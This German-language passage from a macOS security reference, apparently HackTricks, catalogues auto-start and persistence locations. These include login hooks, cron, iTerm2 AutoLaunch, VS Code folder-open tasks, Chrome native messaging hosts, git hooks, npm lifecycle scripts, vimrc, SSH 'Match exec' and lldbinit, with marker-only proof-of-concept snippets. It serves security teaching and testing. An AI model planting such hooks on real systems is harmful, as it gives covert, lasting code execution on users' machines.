Du kannst ein eigenes QuickLook-Plug-in kompilieren, es an einem der oben genannten Speicherorte ablegen, damit es geladen wird, und anschließend eine unterstützte Datei auswählen und die Leertaste drücken, um es auszuführen.

Diese Pfade beziehen sich auf ältere `.qlgenerator`-Bundles. [Apples Architekturleitfaden für Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) beschreibt die Suchreihenfolge und den Abgleich von Dateitypen. Aktuelle Quick-Look-**App-Erweiterungen** werden mit einer App gebündelt und unterliegen anderen Registrierungs- und Ausführungsregeln. Dass ein Generator vorhanden ist, belegt weder, dass er bei der Typauswahl zum Zuge kommt, noch, dass sein Code direkt im Finder ausgeführt wird. Der Pfad für ältere Generatoren wurde anhand der Dokumentation und des Vorhandenseins des Verzeichnisses geprüft; auf dem Research-Mac war kein Generator installiert oder geladen.

### ~~Login-/Logout-Hooks~~

> [!CAUTION]
> Das hat bei mir weder mit dem LoginHook des Benutzers noch mit dem LogoutHook von root funktioniert.

**Write-up**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Du musst etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` ausführen können.
  - Zu finden unter `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Um es zu löschen:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Der Eintrag für den Root-Benutzer wird unter **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gespeichert.

## Conditional Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind. Damit kannst du einfach etwas ausführen, indem du es **in eine Datei schreibst** und auf nicht alltägliche Bedingungen setzt, etwa bestimmte **installierte Programme, „ungewöhnliche“ Benutzeraktionen** oder Umgebungen.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nützlich für sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Du musst jedoch die `crontab`-Binary ausführen können
  - Oder Root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/usr/lib/cron/tabs/`**
  - Für direkten Schreibzugriff ist Root erforderlich. Root ist nicht erforderlich, wenn du `crontab <file>` ausführen kannst.
  - **Auslöser**: Der Zeitplan in der installierten crontab. `at` und `periodic` sind separate Mechanismen, die weiter unten beschrieben werden.

#### Beschreibung & Ausnutzung

Liste die Cron-Jobs des **aktuellen Benutzers** auf mit:

```bash
crontab -l
```

Die launchd-plist des systemeigenen cron-Daemons enthält einen Eintrag `QueueDirectories` für `/usr/lib/cron/tabs`; dort werden die installierten Benutzer-crontabs gespeichert. Zum Prüfen der crontabs anderer Benutzer sind Root-Rechte erforderlich:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

In einem entbehrlichen Konto lässt sich mit `crontab` ein reiner Markereintrag für den Benutzer installieren und nach der Beobachtung wieder entfernen. Durch `crontab <file>` wird **die gesamte vorhandene Crontab des Kontos ersetzt**. Speichere sie daher und stelle sie wieder her, wenn das Konto nicht entbehrlich ist:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 wurden früher TCC-Berechtigungen gewährt

#### Speicherorte

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Auslöser**: iTerm2 mit einem geeigneten Python-API-Skript in diesem Ordner starten
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Auslöser**: iTerm2 starten; der AppleScript-Startup-Hook ist separat dokumentiert
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Auslöser**: Eine Sitzung mit dem Profil erstellen, dessen Befehl oder Anfangstext die Payload aufruft

#### Beschreibung & Ausnutzung

Der [aktuelle iTerm2-Python-API-Leitfaden](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) dokumentiert automatisch ausgeführte **Python**-Skripte in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Er belegt nicht, dass eine beliebige ausführbare `.sh`-Datei in diesem Ordner ausgeführt wird. Speichere für ein Wegwerf-Konto Folgendes als `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Der [aktuelle iTerm2-AppleScript-Leitfaden](https://iterm2.com/documentation-scripting.html) dokumentiert separat `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, mit einem Fallback auf das Legacy-Verzeichnis `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`, wenn der moderne Ordner nicht existiert. Ein AppleScript, das nur einen Marker setzt, sieht so aus:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Diese Skriptbeispiele wurden anhand der iTerm2-Dokumentation geprüft und nicht in einer aktiven Desktop-Sitzung ausgeführt. Entferne nach dem Testen in einem Wegwerf-Account das Testskript und `/tmp/ht-iterm-autolaunch-marker` bzw. `/tmp/iterm2-autolaunchscpt`.

Die iTerm2-Einstellungen in **`~/Library/Preferences/com.googlecode.iterm2.plist`** können einen Profilbefehl oder initialen Text festlegen. Letzterer wird in eine Sitzung eingegeben; die Ausführung hängt davon ab, ob eine Shell ihn interpretiert. [Die Profildokumentation von iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) beschreibt den Befehl, der ausgeführt wird, wenn eine neue Sitzung mit diesem Profil erstellt wird.

Diese Einstellung lässt sich in den iTerm2-Einstellungen konfigurieren:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Der Befehl wird in den Einstellungen angezeigt:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Für eine sichere Bewertung sollten Sie das ausgewählte Profil in den iTerm2-Einstellungen prüfen oder eine Kopie seiner Einstellungsdatei lesen. Eine Änderung von `Initial Text` in einem aktiven Profil würde sich auf die Sitzungen eines Benutzers auswirken, daher wurde auf dem Forschungs-Mac keine Einstellung geändert.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - xbar muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Es fordert Bedienungshilfen-Berechtigungen an

#### Speicherort

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Auslöser**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, lässt sich ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** schreiben, das beim Start von xbar ausgeführt wird:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Hammerspoon muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Die App fordert Bedienungshilfen-Berechtigungen an

#### Location

- **`~/.hammerspoon/init.lua`**
  - **Trigger**: Sobald Hammerspoon ausgeführt wird

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und verwendet dafür die **LUA-Skriptsprache**. Besonders hervorzuheben ist, dass sich vollständiger AppleScript-Code integrieren und Shell-Skripte ausführen lassen, wodurch die Skriptfunktionen erheblich erweitert werden.<sup>[[13]](#references)</sup>

Die App sucht nach einer einzelnen Datei, `~/.hammerspoon/init.lua`, und führt das Skript beim Start aus.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - BetterTouchTool muss jedoch installiert sein
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Es fordert die Berechtigungen Automation-Shortcuts und Accessibility an

#### Speicherort

- Eine Skriptdatei, auf die in einem aktivierten BetterTouchTool-Preset **bereits verwiesen wird**, oder die Konfiguration dieses Presets unter `~/Library/Application Support/BetterTouchTool/`. Der genaue Skriptpfad hängt davon ab, wie das Preset konfiguriert wurde.

[Die Aktionsreferenz von BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) dokumentiert Shell-Skript- und Hintergrundbefehlsaktionen. Das konfigurierte Tastatur-, Maus-, Touch-, Widget- oder sonstige Ereignis muss eintreten, während das relevante Preset aktiv ist; [die Trigger-Anleitung](https://docs.folivora.ai/docs/configuration/new-trigger/) zeigt diese Zuordnung. Eine beliebige Datei im Application-Support-Verzeichnis ist kein Trigger. Eine bereits konfigurierte Aktion, die ein externes, beschreibbares Skript lädt, ist ein enger gefasstes Schreib-zu-Ausführung-Ziel. Der Code wird unter dem Konto des BetterTouchTool-Benutzers und mit den tatsächlich erteilten macOS-Berechtigungen ausgeführt. BetterTouchTool war auf dem Forschungs-Mac nicht unter `/Applications` vorhanden, daher wurde lokal kein Preset geändert oder ausgeführt.

### Alfred

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Alfred muss jedoch installiert sein
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Es fordert die Berechtigungen Automation, Accessibility und sogar Full-Disk-Zugriff an

#### Speicherort

- Ein Skript oder eine Datei, auf die in einem installierten Alfred-Workflow **bereits verwiesen wird**, oder dieser Workflow innerhalb des vom Benutzer konfigurierten Verzeichnisses `Alfred.alfredpreferences`. Das Einstellungsverzeichnis kann synchronisiert werden und hat keinen festgelegten, universellen Pfad.

[Alfreds Workflow-Anleitung](https://www.alfredapp.com/help/workflows/) beschreibt die Powerpack-Voraussetzung und die Installation über die Benutzeroberfläche. Ein Hotkey, ein Schlüsselwort oder ein anderer konfigurierter Trigger eines installierten Workflows muss ausgelöst werden; [Alfreds Hotkey-Beispiel](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) zeigt eine Skriptaktion. [Alfreds Umgebungsreferenz](https://www.alfredapp.com/help/workflows/script-environment-variables/) stellt den ausgewählten Einstellungspfad als `alfred_preferences` bereit. Das Ablegen einer nicht registrierten Workflow-Datei in einem beliebigen Verzeichnis belegt nicht, dass sie installiert oder ausgeführt wird. Der Code wird als angemeldeter Alfred-Benutzer mit den tatsächlich erteilten macOS-Berechtigungen ausgeführt. Alfred war auf dem Forschungs-Mac nicht unter `/Applications` vorhanden, daher wurde dieser Pfad ausschließlich anhand der Dokumentation bewertet.

### Raycast Script Commands und Extension-Refresh

- **Schreibziel:** Ein ausführbares Skript in einem Verzeichnis, das unter Raycast Settings → Script Commands **bereits hinzugefügt wurde**. Raycast durchsucht kein beliebiges neu erstelltes Verzeichnis. [Raycasts Anleitung zu Script Commands](https://manual.raycast.com/script-commands) beschreibt die Registrierung von Verzeichnissen.
- **Trigger und Identität:** Ein Benutzer ruft den indizierten Befehl auf, ein konfigurierter Hotkey oder Fallback löst ihn aus, oder Raycast aktualisiert ein `inline`-Skript zu dessen konfiguriertem `@raycast.refreshTime`. Das Skript wird als angemeldeter Raycast-Benutzer über dessen Interpreter ausgeführt. Die [Referenz der Upstream-Metadaten](https://github.com/raycast/script-commands#metadata) beschränkt die automatische Aktualisierung auf Inline-Befehle, und [Raycasts Extension-Manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) unterstützt separat ein `interval` für installierte `no-view`- oder `menu-bar`-Extension-Befehle. Ein normales Script Command einfach hinzuzufügen, plant keine Ausführung.

Für ein Wegwerf-Konto mit einem registrierten Skriptverzeichnis sieht ein Inline-Skript, das nur eine Markierung schreibt, so aus:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Speichere sie im registrierten Verzeichnis, mache sie ausführbar und lasse Raycast sie aktualisieren. Entferne anschließend diese Datei und `/tmp/ht-raycast-refresh-marker`. Raycast wurde auf dem Research-Mac nicht unter seinem üblichen Namen in `/Applications` gefunden. Dieser Vorgang ist daher durch Dokumentation belegt und wurde nicht lokal ausgeführt. Für Bedienungshilfen, Automation und Dateizugriffe können weiterhin macOS-Berechtigungsabfragen erscheinen.

### Automatische Workspace-Tasks in Visual Studio Code

- **Schreibziel:** `.vscode/tasks.json` in einem Workspace, den der Benutzer öffnen wird.
- **Auslöser:** Öffnen dieses Workspace in VS Code, jedoch nur, wenn der Ordner als vertrauenswürdig eingestuft ist **und** automatische Tasks zugelassen wurden. In einem nicht vertrauenswürdigen Workspace werden niemals automatische Tasks ausgeführt; bei der Standardeinstellung wird der Benutzer vor dem ersten automatischen Start gefragt. Die [VS-Code-Dokumentation zu Tasks](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) und die [Dokumentation zu Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) beschreiben beide Voraussetzungen.
- **Ausführungsidentität:** Das Benutzerkonto von VS Code, über den konfigurierten Task-Prozess. Dies ist eine anwendungsspezifische Ausführung, keine Persistenz beim Login.

Lege in einem **neuen, wegwerfbaren Workspace** diese Task an, die nur eine Markierung erzeugt, und speichere sie in `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nach dem Öffnen des vertrauenswürdigen Workspace und dem Zulassen automatischer Tasks prüfe, ob `.autostart-task-ran` vorhanden ist. Entferne den Task-Eintrag und die Markierungsdatei, um aufzuräumen. **Dies wurde anhand der Microsoft-Dokumentation und des installierten VS Code 1.139.1-Bundles überprüft; es wurde nicht in der aktiven Desktop-Sitzung ausgeführt.**

### Chrome native messaging hosts

- **Schreibziel:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` für den aktuellen Benutzer oder `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` für alle Benutzer (Schreibrechte für Admins erforderlich). Chromium und Chrome for Testing verwenden unterschiedliche Verzeichnisse; siehe [aktuelle Pfadtabelle von Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Auslöser:** Eine installierte Chrome-Erweiterung mit der Berechtigung `nativeMessaging` ruft `chrome.runtime.connectNative()` oder `chrome.runtime.sendNativeMessage()` mit dem exakten Hostnamen aus dem Manifest auf. Chrome startet daraufhin die Host-Datei. Das bloße Öffnen von Chrome führt keinen beliebigen neuen native host aus; das Erstellen eines Manifests ohne aufrufende Erweiterung bewirkt nichts. [Chromes Anleitung zu native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) beschreibt diesen Handshake.
- **Ausführungsidentität:** Das Konto des Chrome-Benutzers. Im Manifest muss ein absoluter Pfad zur ausführbaren Datei angegeben und der Ursprung der aufrufenden Erweiterung explizit zugelassen werden.

In einem wegwerfbaren Browserkonto mit einer Test-Erweiterung demonstriert das folgende Dateipaar die Verbindung zwischen Schreiben und Ausführung. Der Dateiname des Manifests muss mit seinem `name` übereinstimmen, und `TEST_EXTENSION_ID` muss durch die tatsächliche ID der Erweiterung ersetzt werden:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Speichere dieses JSON unter `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Die ausschließlich als Marker dienende ausführbare Datei unter `path` im Manifest kann Folgendes enthalten:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nachdem die Test-Extension von ihrem Service Worker oder ihrer Erweiterungsseite aus `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` aufruft, bestätigt die Markierung, dass der Host gestartet wurde. Dieser minimale Host implementiert nicht das Response-Protokoll von Chrome mit vorangestellter Längenangabe, daher meldet die Extension möglicherweise einen Messaging-Fehler, nachdem die Markierung geschrieben wurde. Entferne zum Aufräumen das Test-Manifest, den Host und die Markierung. Unter macOS 26.5.2 waren die Chrome-App und beide Manifest-Verzeichnisse vorhanden; **das aktive Chrome-Profil wurde weder verändert noch verwendet**.

### Karabiner-Elements-Befehle für Tastenereignisse

- **Schreibziel:** `~/.config/karabiner/karabiner.json` in einem Konto, in dem Karabiner-Elements installiert ist und läuft. [Karabiners Anleitung zum Speicherort der Datei](https://karabiner-elements.pqrs.org/docs/json/location/) besagt, dass die App diese Datei überwacht und nach einem Schreibvorgang neu lädt. JSON-Dateien in `assets/complex_modifications` sind lediglich importierbare Voreinstellungen; sie dort abzulegen aktiviert keine Regel.
- **Auslöser:** Das konfigurierte Tastenereignis, nachdem die Regel aktiviert wurde. Die Referenz zu [`to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) beschreibt die Befehlsausführung. Dabei handelt es sich nicht um Codeausführung bei der Anmeldung oder bei jedem Schreibvorgang in eine Datei.
- **Ausführungsidentität:** Der angemeldete Benutzer, unter dem der Benutzerprozess von Karabiner läuft. Die eigenen Berechtigungen und jeder TCC-Zugriff hängen von der App und ihrer Version ab.

Füge für ein entbehrliches Testkonto dieses Regelobjekt zum Array `complex_modifications.rules` des ausgewählten Profils in `karabiner.json` hinzu und behalte den übrigen Inhalt des Profils bei. Drücke F18, um eine harmlose Markierung zu erstellen, und entferne anschließend diese Regel und die Markierung. F18 zu wählen vermeidet, eine gewöhnliche Taste zum Tippen zu ersetzen:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements war auf dem Testcomputer mit macOS 26.5.2 nicht unter `/Applications` installiert. Daher handelt es sich um einen durch Dokumentation belegten PoC und nicht um ein lokales Laufzeitergebnis.

### Git hooks in einem lokalen Repository

- **Schreibziel:** Ein ausführbarer Hook wie `<repo>/.git/hooks/post-checkout`. Falls `core.hooksPath` bereits gesetzt wurde, ist stattdessen das konfigurierte Verzeichnis zu verwenden. Ein als gewöhnliche Quelldatei getrackter Hook wird nicht automatisch in einem Clone installiert.
- **Trigger:** Die entsprechende Git-Operation. `post-checkout` wird beispielsweise nach `git checkout` oder `git switch` ausgeführt und kann auch nach dem Erstellen eines Clones oder Worktrees laufen. [Gits Hook-Referenz](https://git-scm.com/docs/githooks) führt die Ereignisse und die erforderliche Ausführungsberechtigung auf; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) ändert das Verzeichnis, in dem nach Hooks gesucht wird.
- **Ausführungsidentität:** Das Konto, unter dem Git ausgeführt wird. Der Hook kann nur ausgeführt werden, wenn das effektive Hooks-Verzeichnis des Repositorys für den Akteur beschreibbar ist und der Benutzer später die entsprechende Git-Operation ausführt.

Dieser PoC, der nur einen Marker erstellt, legt ein vollständig entbehrliches Repository an, installiert einen Hook und wechselt den Branch. Er wurde mit Apple Git 2.50.1 unter macOS 26.5.2 erfolgreich ausgeführt:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle scripts in einem Projekt

- **Schreibziel:** Die Map `scripts` in der `package.json` eines beschreibbaren Projekts oder eines installierten Dependency-Pakets, dessen Lifecycle-Script der Benutzer ausführen wird. Dies ist ein Hook im Entwicklungsworkflow, keine Ausführung durch das Öffnen eines Verzeichnisses.
- **Auslöser und Identität:** Ein späteres `npm install` oder `npm ci` mit erlaubten Lifecycle-Scripts führt `preinstall`, `install` und `postinstall` als der Benutzer aus, der npm aufruft. Ein gewöhnliches `npm run <name>` führt außerdem passende `pre<name>`- und `post<name>`-Scripts aus. [npm's lifecycle reference](https://docs.npmjs.com/cli/v11/using-npm/scripts) führt die Events auf; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) kann Install-Lifecycle-Scripts unterdrücken. Versions- und Richtlinieneinstellungen können ändern, was erlaubt ist. Prüfen Sie daher die npm-Version des Ziels.

Dieser PoC, der lediglich einen Marker setzt, wurde mit lokalem npm in einem temporären, leeren Verzeichnis ausgeführt. Er lädt keine Dependencies herunter und verändert das Projekt eines Benutzers nicht:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Dies unterscheidet sich von Python-Interpreter-Startdateien: npm muss die entsprechende Installations- oder Run-Aktion ausführen, während Python-`site`-Code bei einem gewöhnlichen Interpreter-Aufruf geladen werden kann. Allgemeine `Makefile`-Targets und Build-Task-Definitionen erfordern ebenfalls, dass der Benutzer oder ein bereits konfiguriertes Tool das jeweilige Target aufruft; sie sind keine eigenständigen OS-Autostartpfade.

### Vim-Startkonfiguration

- **Schreibziel:** `~/.vimrc` für den Benutzer, der Vim startet (oder eine andere Startdatei, die Vim gemäß seiner Initialisierungsreihenfolge auswählt). [Vims Startreferenz](https://vimhelp.org/starting.txt.html) dokumentiert die Datei sowie die Overrides `VIMINIT`/`EXINIT`.
- **Auslöser:** Ein anschließender gewöhnlicher Vim-Start, der diese Konfiguration lädt. Vim umgeht die Benutzer-vimrc mit `-u NONE`. Dies ist eine editorspezifische Ausführung und kein OS-Login-Auslöser.
- **Ausführungsidentität:** Das Konto des Vim-Benutzers.

Der folgende isolierte PoC wurde mit macOS-`/usr/bin/vim` ausgeführt; er schreibt keine echten Vim-Einstellungen oder geöffneten Dokumente:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim verfügt über einen separaten Benutzerkonfigurationspfad, `$XDG_CONFIG_HOME/nvim/init.lua` oder `init.vim`, und lädt laut seiner [Startup-Dokumentation](https://neovim.io/doc/user/starting/) außerdem Skripte aus den `plugin/`-Runtime-Verzeichnissen. Neovim war auf dem Testgerät mit macOS 26.5.2 nicht installiert, daher wurde diese Variante dort nicht ausgeführt.

### SSH-Client-Konfigurationsbefehle

- **Schreibziel:** `~/.ssh/config` oder eine andere Datei, die bereits eingebunden wird. Dies ist eine **Client**-Konfigurationsdatei; sie ist von der unten beschriebenen serverseitigen `~/.ssh/rc` getrennt.
- **Auslöser:** Ein passender `ssh`-Aufruf. `Match exec` führt einen lokalen Befehl aus, während der Client seine Konfiguration auswertet, auch bei `ssh -G`, das die Konfiguration ausgibt, ohne eine Verbindung herzustellen. `ProxyCommand` wird ausgeführt, wenn der Client eine passende Verbindung herstellt. `LocalCommand` wird erst nach einer erfolgreichen Verbindung ausgeführt und setzt `PermitLocalCommand yes` voraus (Standardwert ist `no`). Diese Befehle unterscheiden sich in Zeitpunkt und Voraussetzungen; ein Schreibvorgang allein führt sie nicht aus. Siehe die [OpenSSH-Referenz `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Ausführungsidentität:** Der lokale Benutzer, der `ssh` ausführt. Ein passender Host, eine anwendbare Konfigurationsdatei und alle erforderlichen Verbindungen sind nötig. Mit `ssh -F` lässt sich eine andere Konfigurationsdatei auswählen.

Dieser PoC, der nur eine Markierung schreibt, wurde mit Apples SSH-Client unter macOS 26.5.2 ausgeführt. `-G` testet `Match exec`, ohne eine Netzwerkverbindung herzustellen oder die echte SSH-Konfiguration des Benutzers einzulesen:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger-Initialisierungsdateien

- **Schreibziel:** `~/.lldbinit` oder die Datei mit höherer Priorität für die jeweilige Anwendung, z. B. `~/.lldbinit-lldb`. LLDB liest eine davon beim Start des Debuggers. Eine `.lldbinit` im aktuellen Verzeichnis wird **nicht** standardmäßig ausgeführt; der Benutzer muss `target.load-cwd-lldbinit` aktivieren oder `--local-lldbinit` übergeben. Siehe das [LLDB-Handbuch](https://lldb.llvm.org/man/lldb.html).
- **Auslöser und Identität:** Der Benutzer startet LLDB ohne `--no-lldbinit`; Befehle werden mit den Rechten dieses Benutzers ausgeführt. Allein das Öffnen eines Projekts bedeutet nicht, dass dessen `.lldbinit` ausgeführt wird.

Der folgende reine Marker-Test wurde mit LLDB unter macOS 26.5.2 in einem isolierten Home-Verzeichnis und Arbeitsverzeichnis ausgeführt:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB** listet die [upstream startup documentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) für macOS `$HOME/Library/Preferences/gdb/gdbinit` und anschließend `~/.gdbinit` auf. Eine `.gdbinit` im aktuellen Verzeichnis unterliegt dem [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), und `-nx`/`-nh` unterdrücken Initialisierungsdateien. GDB war auf dem Test-Mac nicht installiert, daher wurde diese Variante lokal nicht ausgeführt.

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - SSH muss jedoch aktiviert und verwendet werden
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH-Nutzung, um FDA-Zugriff zu erhalten

#### Speicherort

- **`~/.ssh/rc`**
  - **Auslöser**: Anmeldung via SSH
- **`/etc/ssh/sshrc`**
  - Root erforderlich
  - **Auslöser**: Anmeldung via SSH

> [!CAUTION]
> Zum Aktivieren von SSH ist Full Disk Access erforderlich:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beschreibung & Ausnutzung

